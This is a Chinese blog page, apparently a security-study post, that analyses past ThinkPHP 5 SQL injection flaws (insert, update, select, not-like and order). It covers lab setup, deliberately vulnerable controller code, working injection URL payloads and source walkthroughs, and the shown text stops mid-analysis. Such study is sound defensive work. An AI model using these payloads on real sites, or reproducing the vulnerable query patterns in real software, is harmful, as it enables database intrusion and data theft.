@@ -1,0 +1,662 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/6.png">
+  <link rel="icon" href="/img/bg/6.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="海马少年">
+  <meta name="keywords" content="">
+  <meta name="description" content="ThinkPHP 5框架学习 ThinkPHP 5.0.24  thinkphp5 与 thinkphp3 的区别 https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1135144  https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_37836194&#x2F;article&#x2F;details&#x2F;89517379 目录结构  程序的入口文件是在 public&#x2F;index.p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tp5 SQL注入">
+<meta property="og:url" content="http://example.com/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="ThinkPHP 5框架学习 ThinkPHP 5.0.24  thinkphp5 与 thinkphp3 的区别 https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1135144  https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_37836194&#x2F;article&#x2F;details&#x2F;89517379 目录结构  程序的入口文件是在 public&#x2F;index.p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211001220058899.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211002184117887.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211028232421470.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029000949504.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029001626730.png">
+<meta property="og:image" content="d:/markdown/image-20211029002700010.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029163300310.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029164350160.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029164304431.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029170335139.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029171046857.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029171704358.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029172740053.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029182836622.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029195319761.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029194524372.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029193916454.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029200920783.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211029204945485.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030001513315.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030002532518.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030003754664.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030004242391.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030201755912.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030211107424.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030211648109.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030223027240.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030224610437.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211030234224569.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211031000952539.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211031003033967.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211031010520705.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211031010535400.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211031010558540.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211031010810261.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211031012135626.png">
+<meta property="article:published_time" content="2021-10-30T17:37:01.000Z">
+<meta property="article:modified_time" content="2021-10-30T17:38:04.933Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211001220058899.png">
+  
+  <title>Tp5 SQL注入 - Lcdm123</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"*","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>海马少年</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Tp5 SQL注入">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-31 01:37" pubdate>
+        2021年10月31日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Tp5 SQL注入</h1>
+            
+            <div class="markdown-body">
+              <h1 id="ThinkPHP-5"><a href="#ThinkPHP-5" class="headerlink" title="ThinkPHP 5"></a>ThinkPHP 5</h1><h2 id="框架学习"><a href="#框架学习" class="headerlink" title="框架学习"></a>框架学习</h2><blockquote>
+<p>ThinkPHP 5.0.24</p>
+</blockquote>
+<p>thinkphp5 与 thinkphp3 的区别</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1135144">https://cloud.tencent.com/developer/article/1135144</a> </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37836194/article/details/89517379">https://blog.csdn.net/m0_37836194/article/details/89517379</a></p>
+<p>目录结构</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001220058899.png" srcset="/img/loading.gif" lazyload alt="image-20211001220058899"></p>
+<p>程序的入口文件是在 <code>public/index.php</code> 然后加载 <code>thinkphp/start.php</code> 在 <code>thinkphp/base.php</code> 中定义了一些常量，做好准备工作后就会执行 <code>App::run()-&gt;send()</code> 启动框架</p>
+<p>路由逻辑</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211002184117887.png" srcset="/img/loading.gif" lazyload alt="image-20211002184117887"></p>
+<blockquote>
+<p>还存在一些其他的路由方法</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/public/index.php/index/index/index2">http://127.0.0.1/public/index.php/index/index/index2</a></p>
+</blockquote>
+<p>大致的源码阅读已经有大佬写了文章，这里我就不再写了，直接看就好了</p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p>
+<h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><h4 id="SQL1（insert）"><a href="#SQL1（insert）" class="headerlink" title="SQL1（insert）"></a>SQL1（insert）</h4><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.015 5.1.0&lt;=ThinkPHP&lt;=5.15</strong></p>
+<p>环境的安装利用<code>composer</code></p>
+<p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// application/index/controller/Index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;insert(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;$username);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Update success&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create database tpdemo;<br>use tpdemo;<br>create table users(<br>	id int primary key auto_increment,<br>	username varchar(50) not null<br>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>漏洞复现</strong></p>
+<p><code>insert()</code>注入</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>: /public/index.php/index/index/index?username[<span class="hljs-number">0</span>]=inc&amp;username[<span class="hljs-number">1</span>]=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028232421470.png" srcset="/img/loading.gif" lazyload alt="image-20211028232421470"></p>
+<blockquote>
+<p>需要再配置文件中开启调试功能，才会有报错回显</p>
+</blockquote>
+<p><strong>漏洞分析</strong></p>
+<blockquote>
+<p>漏洞分析的技巧可以对比官方更新文档来推测出漏洞点的位置</p>
+</blockquote>
+<p>直接寻找到 <code>insert()</code> 函数，<code>$username</code> 就是传入 <code>$data</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029000949504.png" srcset="/img/loading.gif" lazyload alt="image-20211029000949504"></p>
+<p><code>$data</code>是数组，所以执行后面的判断，这里的<code>inc</code> 和<code>dec</code> 都可以拿来注入，<code>exp</code>不行因为官方之前就有过滤了</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029001626730.png" srcset="/img/loading.gif" lazyload alt="image-20211029001626730"></p>
+<p>这里的过滤把传入的一写危险单词给过滤了</p>
+<p><img src="D:\markdown\image-20211029002700010.png" srcset="/img/loading.gif" lazyload alt="image-20211029002700010"></p>
+<p>最后将处理后的参数直接加入SQL语句这样就造成了注入</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51">https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51</a></p>
+<h4 id="SQL2（update）"><a href="#SQL2（update）" class="headerlink" title="SQL2（update）"></a>SQL2（update）</h4><p><strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong></p>
+<p><strong>环境搭建</strong></p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.* <span class="hljs-string">tpdemo</span><br></code></pre></td></tr></table></figure>
+
+<p>修改<code>composer.json</code> 文件中 ThinkPHP 的版本然后执行<code>composer update</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029163300310.png" srcset="/img/loading.gif" lazyload alt="image-20211029163300310"></p>
+<p>添加入口代码</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164350160.png" srcset="/img/loading.gif" lazyload alt="image-20211029164350160"></p>
+<p>开启debug模式不然报错注入没有回显，并且配置好框架数据库信息</p>
+<p><strong>漏洞复现</strong></p>
+<p>payload:<code>http://127.0.0.1/public/index.php/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,database(),0x7e),1)^&amp;username[3]=1</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164304431.png" srcset="/img/loading.gif" lazyload alt="image-20211029164304431"></p>
+<p><strong>漏洞分析</strong></p>
+<p>直接根据 payload 来查看漏洞点，也可以查看官方的更新记录根据前后对比来发掘漏洞点</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029170335139.png" srcset="/img/loading.gif" lazyload alt="image-20211029170335139"></p>
+<p>最终的 <code>update()</code> 函数是在<code>builder.php</code>中构建的 SQL 语句</p>
+<p>最后的漏洞出现在<code>parseArrayData()</code>函数这里</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171046857.png" srcset="/img/loading.gif" lazyload alt="image-20211029171046857"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171704358.png" srcset="/img/loading.gif" lazyload alt="image-20211029171704358"></p>
+<p>这个函数的<code>list()</code>函数反向赋值有点没有看懂？？？</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029172740053.png" srcset="/img/loading.gif" lazyload alt="image-20211029172740053"></p>
+<p>这里把传入的参数进行了拼接然后插入进了 SQL 语句中，并且没有经过任何过滤措施，就造成了SQL注入漏洞</p>
+<h4 id="SQL3（select）"><a href="#SQL3（select）" class="headerlink" title="SQL3（select）"></a>SQL3（select）</h4><p>影响范围：ThinkPHP 全版本</p>
+<p><strong>环境搭建</strong></p>
+<p>直接利用上一个环境即可</p>
+<p>入口</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;exp&#x27;</span>,$username)-&gt;select();<br>        <span class="hljs-keyword">return</span> $result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>漏洞复现</strong></p>
+<p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)--+</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029182836622.png" srcset="/img/loading.gif" lazyload alt="image-20211029182836622"></p>
+<p><strong>漏洞分析</strong></p>
+<p>调试的时候直接在<code>Builder</code> 类<code>select()</code>处下断点，因为主要是在这里生成 SQL 语句</p>
+<p>从 <code>select()</code> 中的 <code>parseWhere()</code> 到 <code>buildWhere()</code> 然后到 <code>parseWhereItem()</code> </p>
+<p><code>parseWhereItem()</code>中是漏洞的主要点（记得好像 TP3 也有类似），获取到值输入的语句</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029195319761.png" srcset="/img/loading.gif" lazyload alt="image-20211029195319761"></p>
+<p>这里循环检测<code>$exp</code>是否在<code>$parser</code>数组中，如果存在就进入执行拼接语句并且返回（未做任何过滤）</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029194524372.png" srcset="/img/loading.gif" lazyload alt="image-20211029194524372"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029193916454.png" srcset="/img/loading.gif" lazyload alt="image-20211029193916454"></p>
+<p>最后构成SQL注入</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029200920783.png" srcset="/img/loading.gif" lazyload alt="image-20211029200920783"></p>
+<blockquote>
+<p>分析得比较简略</p>
+</blockquote>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81</a></p>
+<h4 id="SQL4"><a href="#SQL4" class="headerlink" title="SQL4"></a>SQL4</h4><p>漏洞影响：<code>ThinkPHP=5.0.10</code></p>
+<p><strong>环境搭建</strong></p>
+<p><code>composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();<br>        var_dump($result);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>漏洞复现</strong></p>
+<p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=)%20union%20select%201,user()--+ </code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029204945485.png" srcset="/img/loading.gif" lazyload alt="image-20211029204945485"></p>
+<p><strong>漏洞分析</strong></p>
+<p>当数据传输给服务器时，不管使用哪种方法在 <code>ThinkPHP</code> 中都会经过 <code>Request</code> 类的 <code>input</code> 方法，这些数据都会被强制类型转换，并且经过 <code>filterValue</code> 方法的处理</p>
+<p>注意这里的过滤虽然包含了 NOTLIKE 但是这里中间没有空格</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030001513315.png" srcset="/img/loading.gif" lazyload alt="image-20211030001513315"></p>
+<p>动态调试一下</p>
+<p>这里直接跳过了，没有被过滤</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030002532518.png" srcset="/img/loading.gif" lazyload alt="image-20211030002532518"></p>
+<p>之后的参数拼接，主要就是在<code>parseWhereItem()</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030003754664.png" srcset="/img/loading.gif" lazyload alt="image-20211030003754664"></p>
+<p>这里就是利用payload中username需要传入二维数组的原因</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030004242391.png" srcset="/img/loading.gif" lazyload alt="image-20211030004242391"></p>
+<p>最后执行下来就会造成SQL注入了</p>
+<p>这个漏洞只在 ThinkPHP 5.0.10中出现是因为之前的版本中默认不允许出现 not like。</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/</a></p>
+<h4 id="SQL5-（order）"><a href="#SQL5-（order）" class="headerlink" title="SQL5 （order）"></a>SQL5 （order）</h4><p>影响版本：<code>5.1.16&lt;=ThinkPHP&lt;=5.1.22</code></p>
+<p><strong>环境搭建</strong></p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.<span class="hljs-string">22 </span><span class="hljs-string">tp5.</span>1.<span class="hljs-string">22</span><br></code></pre></td></tr></table></figure>
+
+<p>然后修改<code>compose.json</code>更新一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $orderby = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>])-&gt;order($orderby)-&gt;find();<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>需注意的是 php 的版本问题</p>
+</blockquote>
+<p><strong>漏洞复现</strong></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/public/index.php/index/index/index?orderby</span>[<span class="hljs-string">id`|updatexml(1,concat(0x7,user(),0x7e),1)%23</span>]=1<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030201755912.png" srcset="/img/loading.gif" lazyload alt="image-20211030201755912"></p>
+<p><strong>漏洞分析</strong></p>
+<blockquote>
+<p>这个 payload 有点奇怪没有见过，是在键中的</p>
+</blockquote>
+<p>这个漏洞主要是由 <code>order</code> 引起的</p>
+<p>传入的值会经过<code>Request</code>类中的<code>input()</code>函数，之后就会经过过滤函数</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211107424.png" srcset="/img/loading.gif" lazyload alt="image-20211030211107424"></p>
+<p>这里经过递归过滤但是这里的特殊的地方就是 payload 在键中</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211648109.png" srcset="/img/loading.gif" lazyload alt="image-20211030211648109"></p>
+<p>之后就进入查询，因为知道是 order 注入，所以这里直接跟进相关函数，调试时更进到 <code>parseOrder()</code>函数</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030223027240.png" srcset="/img/loading.gif" lazyload alt="image-20211030223027240"></p>
+<p>上面的<code>parseKey（）</code>使用给<code>$key</code>前后添加了反引号</p>
